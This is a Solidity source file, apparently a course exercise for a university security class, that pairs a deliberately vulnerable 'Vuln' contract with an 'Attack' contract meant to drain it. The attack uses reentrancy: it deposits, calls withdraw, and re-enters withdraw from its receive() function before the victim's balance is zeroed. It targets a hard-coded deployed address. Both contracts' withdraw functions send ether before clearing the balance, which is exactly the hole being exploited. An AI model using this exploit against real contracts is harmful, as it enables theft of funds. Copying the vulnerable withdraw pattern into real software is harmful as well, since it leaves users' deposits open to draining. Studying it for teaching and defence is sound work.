/**
 *Submitted for verification at Etherscan.io on 2021-12-07
*/

/**
 *Submitted for verification at Etherscan.io on 2021-11-19
*/

pragma solidity ^0.6.0;

// This contract is written to steal funds from a vulnerable contract written for ECEN4133
// Written for ECEN 4133 at the University of Colorado Boulder: https://ecen4133.org/
// (Adapted from ECEN 5033 w19)
// SPDX-License-Identifier: WTFPL

contract Vuln {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        // Increment their balance with whatever they pay
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        // Refund their balance
        msg.sender.call.value(balances[msg.sender])("");

        // Set their balance to 0
        balances[msg.sender] = 0;
    }
}

contract Attack {
    address vu_add = 0x36A540E3A78084962B75E25877CfACf8846Be018;
    Vuln vu = Vuln(address(vu_add));
    address owner;
    mapping(address => uint256) public balances;
    bool execute = true;

    constructor() public {
        owner = msg.sender;
    }

    // deposit sent money into vulnerable contract, then withdraw twice the amount of money
    function deposit() public payable {
        // Update the balance of the sender  to twice the deposited value
        balances[msg.sender] += msg.value * 2;
        // Deposit the sender's balance into the vuln contract
        vu_add.call{value: msg.value}(abi.encodeWithSignature("deposit()"));
        // Withdraw twice the sender's balance from the vuln contract
        vu.withdraw();
    }

    // function to receive ether from vuln and withdraw more
    receive() external payable {
        if (execute) {
            execute = false;
            vu.withdraw();            
        }
    }

    function withdraw() public {
        // Refund their balance
        msg.sender.call{value: balances[msg.sender]}("");

        // Set their balance to 0
        balances[msg.sender] = 0;
    }
}